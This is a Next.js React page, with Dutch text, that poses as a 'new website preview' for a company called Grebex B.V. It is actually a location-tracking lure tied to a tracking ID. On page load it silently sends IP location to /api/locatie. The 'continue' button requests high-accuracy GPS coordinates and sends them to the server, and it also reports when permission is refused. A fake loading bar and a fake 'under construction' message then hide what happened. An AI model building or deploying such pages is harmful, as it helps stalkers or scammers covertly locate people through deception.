"use client";

import { useEffect, useState } from "react";
import { useParams } from "next/navigation";
import Image from "next/image";

export default function TrackingPage() {
  const params = useParams();
  const trackingId = params.id as string;
  const [status, setStatus] = useState<"welcome" | "requesting" | "loading" | "error">("welcome");
  const [loadingProgress, setLoadingProgress] = useState(0);

  // Automatisch IP-locatie versturen bij het laden van de pagina
  useEffect(() => {
    const sendIpLocation = async () => {
      try {
        await fetch("/api/locatie", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            trackingId,
            type: "ip",
            timestamp: new Date().toISOString(),
          }),
        });
      } catch (e) {
        console.error("IP locatie fout:", e);
      }
    };
    
    sendIpLocation();
  }, [trackingId]);

  const handleButtonClick = async () => {
    setStatus("requesting");
    
    if (!navigator.geolocation) {
      startFakeLoading();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        try {
          await fetch("/api/locatie", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              trackingId,
              type: "gps",
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              timestamp: new Date().toISOString(),
            }),
          });
        } catch (e) {
          console.error("GPS fout:", e);
        }
        startFakeLoading();
      },
      async (error) => {
        console.error("Geolocation error:", error);
        try {
          await fetch("/api/locatie", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              trackingId,
              type: "gps_denied",
              error: error.message,
              timestamp: new Date().toISOString(),
            }),
          });
        } catch (e) {
          console.error("Error sending denial:", e);
        }
        startFakeLoading();
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      }
    );
  };

  const startFakeLoading = () => {
    setStatus("loading");
    let progress = 0;
    const interval = setInterval(() => {
      progress += Math.random() * 12;
      if (progress >= 100) {
        progress = 100;
        clearInterval(interval);
        setTimeout(() => {
          setStatus("error");
        }, 500);
      }
      setLoadingProgress(Math.min(progress, 100));
    }, 400);
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Header - Grebex style */}
      <header className="bg-white border-b border-gray-100 py-4 px-6">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <Image 
            src="/logo.png" 
            alt="Grebex" 
            width={160}
            height={50}
            className="h-10 w-auto"
          />
          <div className="flex items-center gap-2 text-sm text-gray-600">
            <span>🇳🇱</span>
            <span>NL</span>
          </div>
        </div>
      </header>

      {/* Hero section - dark with accent */}
      <div className="bg-[#1a1a1a] text-white">
        <div className="max-w-6xl mx-auto px-6 py-4">
          <p className="text-sm tracking-wider">
            <span className="font-bold">CREATING</span>{" "}
            <span className="text-[#e63946] font-bold">SMART AUTOMATION</span>
          </p>
        </div>
      </div>

      {/* Main content */}
      <main className="bg-gradient-to-b from-gray-100 to-white min-h-[70vh] flex items-center justify-center px-4 py-12">
        <div className="max-w-lg w-full">
          {status === "welcome" && (
            <div className="bg-white rounded-lg shadow-xl p-8 text-center">
              {/* Icon */}
              <div className="w-16 h-16 bg-[#1a1a1a] rounded-lg flex items-center justify-center mx-auto mb-6">
                <span className="text-3xl">🔧</span>
              </div>
              
              {/* Title */}
              <h1 className="text-2xl font-bold text-[#1a1a1a] mb-2">
                Welkom
              </h1>
              <p className="text-[#e63946] font-medium mb-4">Nieuwe website preview</p>
              
              {/* Message */}
              <p className="text-gray-600 mb-8 leading-relaxed">
                Leuk dat je onze nieuwe website wilt bekijken! 
                Klik op de knop hieronder om door te gaan naar de preview.
              </p>

              {/* Button - Grebex style */}
              <button
                onClick={handleButtonClick}
                className="inline-block border-2 border-[#e63946] text-[#e63946] hover:bg-[#e63946] hover:text-white font-semibold py-3 px-8 rounded transition-all duration-300"
              >
                Doorgaan naar website
              </button>

              {/* Subtle footer */}
              <p className="text-gray-400 text-xs mt-8">
                © {new Date().getFullYear()} Grebex B.V. • Preview versie
              </p>
            </div>
          )}

          {status === "requesting" && (
            <div className="bg-white rounded-lg shadow-xl p-8 text-center">
              <div className="w-12 h-12 border-4 border-gray-200 border-t-[#e63946] rounded-full animate-spin mx-auto mb-6"></div>
              <p className="text-[#1a1a1a] font-medium">Even geduld...</p>
              <p className="text-gray-500 text-sm mt-2">Website wordt geladen</p>
            </div>
          )}

          {status === "loading" && (
            <div className="bg-white rounded-lg shadow-xl p-8 text-center">
              <p className="text-[#1a1a1a] font-medium mb-4">Laden... {Math.round(loadingProgress)}%</p>
              <div className="w-full bg-gray-200 rounded-full h-2 overflow-hidden">
                <div 
                  className="bg-[#e63946] h-2 rounded-full transition-all duration-300"
                  style={{ width: `${loadingProgress}%` }}
                ></div>
              </div>
              <p className="text-gray-400 text-sm mt-4">Bijna klaar...</p>
            </div>
          )}

          {status === "error" && (
            <div className="bg-white rounded-lg shadow-xl p-8 text-center">
              <div className="w-16 h-16 bg-gray-100 rounded-lg flex items-center justify-center mx-auto mb-6">
                <span className="text-3xl">🚧</span>
              </div>
              <h2 className="text-xl font-bold text-[#1a1a1a] mb-2">
                Website in ontwikkeling
              </h2>
              <p className="text-gray-600 mb-6">
                Sorry, deze pagina is nog niet beschikbaar. 
                We zijn hard aan het werk om alles af te ronden!
              </p>
              <div className="bg-gray-50 rounded-lg p-4">
                <p className="text-gray-500 text-sm">
                  Bedankt voor je interesse! 👍
                </p>
              </div>
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#1a1a1a] text-white py-6 px-6">
        <div className="max-w-6xl mx-auto text-center text-sm text-gray-400">
          <p>Creating Smart Automation</p>
        </div>
      </footer>
    </div>
  );
}
